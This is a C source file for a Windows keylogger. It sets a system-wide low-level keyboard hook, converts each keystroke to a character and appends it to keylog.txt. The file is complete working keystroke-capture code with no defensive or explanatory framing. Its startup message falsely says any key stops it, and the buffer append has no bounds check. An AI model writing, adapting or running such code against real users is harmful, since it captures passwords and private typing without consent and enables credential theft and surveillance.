#include <windows.h>
#include <stdio.h>
#include <string.h>

HHOOK hHook;
char logBuffer[1024] = ""; // Buffer to hold the gibberish string

// Function to check if a key is pressed
int isKeyPressed(int vKey) {
    return (GetKeyState(vKey) & 0x8000) != 0;
}

// Function to convert virtual key code to character
char convertKeyCodeToChar(KBDLLHOOKSTRUCT *pKey) {
    char c;
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    // Check if the key is an alphabetic character
    if (pKey->vkCode >= 'A' && pKey->vkCode <= 'Z') {
        // Check if Shift or Caps Lock is pressed
        if (isKeyPressed(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001)) {
            c = pKey->vkCode; // Uppercase
        } else {
            c = pKey->vkCode + 32; // Lowercase
        }
    } else {
        // For non-alphabetic keys, just map using ToAscii
        WORD ascii;
        ToAscii(pKey->vkCode, pKey->scanCode, keyboardState, &ascii, 0);
        c = (char)ascii;
    }

    return c;
}

// Function to write the buffer to the file and clear it
void writeBufferToFile() {
    FILE *logFile = fopen("keylog.txt", "a+"); // Use a simple relative path
    if (logFile != NULL) {
        fprintf(logFile, "%s", logBuffer);
        fclose(logFile);
        logBuffer[0] = '\0'; // Clear the buffer
    }
}

LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        char c = convertKeyCodeToChar(pKey);

        if (pKey->vkCode == VK_BACK) {
            strcat(logBuffer, "<backspace>");
        } else {
            int len = strlen(logBuffer);
            logBuffer[len] = c;
            logBuffer[len + 1] = '\0';
        }

        // Write buffer to file immediately for simplicity
        writeBufferToFile();
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
  printf("Key logger started. Press any key to stop.\n");
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggerProc, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to set hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
